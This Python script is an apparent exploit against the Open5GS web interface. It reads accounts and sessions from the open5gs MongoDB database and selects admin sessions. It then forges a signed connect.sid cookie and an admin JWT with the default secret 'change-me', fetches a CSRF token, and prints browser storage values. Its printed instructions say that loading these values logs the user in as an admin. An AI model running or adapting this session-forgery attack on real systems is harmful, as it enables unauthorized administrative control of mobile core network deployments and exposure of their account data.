import argparse
import hmac
import hashlib
import base64
import jwt
import time
import json
from datetime import datetime
from pymongo import MongoClient
from bson import ObjectId
import requests

def get_admin_name(admin_arr):
    names = []
    for admin in admin_arr:
        names.append(admin["username"])
    return names


def convert_mongo_types(obj):
    """
    Converte ricorsivamente ObjectId in stringhe e datetime in ISO format
    Gestisce dict, list e tipi base
    """
    if isinstance(obj, ObjectId):
        return str(obj)
    elif isinstance(obj, datetime):
        return obj.isoformat()
    elif isinstance(obj, dict):
        return {k: convert_mongo_types(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [convert_mongo_types(elem) for elem in obj]
    return obj


def convert_documents(docs):
    """Applica la conversione a una lista di documenti MongoDB"""
    return [convert_mongo_types(doc) for doc in docs]


def sign_session_id(session_id, secret):
    """
    Firma il session id usando HMAC-SHA256, poi lo codifica in base64 senza padding.
    """
    h = hmac.new(
        key=secret.encode("utf-8"),
        msg=session_id.encode("utf-8"),
        digestmod=hashlib.sha256,
    )
    signature = base64.b64encode(h.digest()).decode("utf-8")
    return signature.replace("=", "")


def main():
    parser = argparse.ArgumentParser(
        description="Connect to MongoDB and generate security tokens"
    )
    parser.add_argument(
        "--host", default="localhost", help="MongoDB host (default: localhost)"
    )
    parser.add_argument(
        "--port", type=int, default=27017, help="MongoDB port (default: 27017)"
    )
    args = parser.parse_args()

    try:
        client = MongoClient(args.host, args.port)
        print(f"Connected to MongoDB at {args.host}:{args.port}")

        db = client["open5gs"]
        print("Using database 'open5gs'")
        print(db)
        # Recupera dati da collections
        collections = db.list_collection_names()

        # Conversione documenti con gestione datetime
        accounts_data = (
            convert_documents(db.accounts.find()) if "accounts" in collections else []
        )
        sessions_data = (
            convert_documents(db.sessions.find()) if "sessions" in collections else []
        )

        # Mostra statistiche
        print(f"\nFound {len(accounts_data)} accounts")
        print(f"Found {len(sessions_data)} sessions")

        # Stampa formattata con JSON
        print("\n" + "=" * 50)
        print("First account found:")
        print(json.dumps(accounts_data[0], indent=4, ensure_ascii=False, default=str))

        print("\n" + "=" * 50)
        print("First session found:")
        print(json.dumps(sessions_data[0], indent=4, ensure_ascii=False, default=str))

        # Ricerca sessioni admin
        print("\n" + "=" * 50)
        print("All sessions with user:admin")
        admins = []
        logged_in = []
        for user in accounts_data:
            if user["roles"][0] == "admin":
                print(f"User: {user['username']} is admin\n")
                admins.append(user)
                continue
        print(admins)
        for session in sessions_data:
            data = json.loads(session["session"])  # Converte la stringa in dizionario
            session["session"] = data  # Sovrascrive la stringa con il dizionario
            user = data.get("passport", {}).get(
                "user"
            )  # Ottiene passport.user se esiste
            # check if user is in admins array
            if user in get_admin_name(admins):
                print(f"User: {user}")
                logged_in.append(session)
        print("\n" + "=" * 50)
        print(f"Found {len(logged_in)} available sessions with admin roles\n")
        print(json.dumps(logged_in, indent=4, ensure_ascii=False, default=str))
        # print(json.dumps(sessions_data, indent=4, ensure_ascii=False, default=str))
        # Generazione Cookie di sessione
        print("\n" + "=" * 50)

        secret = "change-me"
        session_id = logged_in[-1]["_id"]
        username = logged_in[-1]["session"]["passport"]["user"]
        for a in admins:
            if a["username"] == username:
                user_id = a["_id"]
                break

        print("By default we take the last logged in admin session\n")
        print(f"Session ID: {session_id}")
        print(f"Username: {username}")
        print(f"User ID: {user_id}")

        print("\n" + "=" * 50)
        signature = sign_session_id(session_id, secret)
        cookie_value = f"s:{session_id}.{signature}"
        print("\nGenerated connect.sid cookie:")
        print(cookie_value)

        # Generazione JWT Admin
        modified_payload = {
            "user": {
                "_id": f"{user_id}",
                "username": f"{username}",
                "roles": ["admin"],
            },
            "iat": int(time.time()),
        }

        new_token = jwt.encode(
            modified_payload,
            secret,
            algorithm="HS256",
            headers={"typ": "JWT", "alg": "HS256"},
        )

        print("\nGenerated JWT token:")
        print(new_token)

        print("\n" + "=" * 50)
        print("\n Grabbing a valid csrf token from the last logged in admin session")

        url = "http://localhost:9999/api/auth/csrf"

        headers = {
            "X-CSRF-TOKEN": "undefined",
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua-mobile": "?0",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "http://localhost:9999/",
            "Accept-Encoding": "gzip, deflate, br",
        }

        cookies = {
            "connect.sid": f"{cookie_value}",
        }

        response = requests.get(
            url,
            headers=headers,
            cookies=cookies
        )

        #print(f"Status Code: {response.status_code}")
        #print(f"Response Content:\n{response.text}")
        csrf_token = response.json()["csrfToken"]
        print(f"CSRF Token: {csrf_token}")
        
        local_storage = {
            "clientMaxAge": 60000,
            "csrfToken": f"{csrf_token}",
            "user": {
                "roles": ["admin"],
                "_id": f"{user_id}",
                "username": f"{username}",
                "__v": 0,
            },
            "authToken": f"{new_token}",
            "expires": int(time.time()) + 60000,
        }
        print("\nGenerated local storage:")
        print(json.dumps(local_storage, indent=4, ensure_ascii=False, default=str))
        print("\nPlease add it to the session local storage with the key 'session' and with the connect.sid cookie in the browser")
        print("After doing this, refresh the page and you should be logged in as an admin user.")
    except Exception as e:
        print(f"\nError: {e}")
    finally:
        if "client" in locals():
            client.close()
            print("\nConnection closed.")


if __name__ == "__main__":
    main()
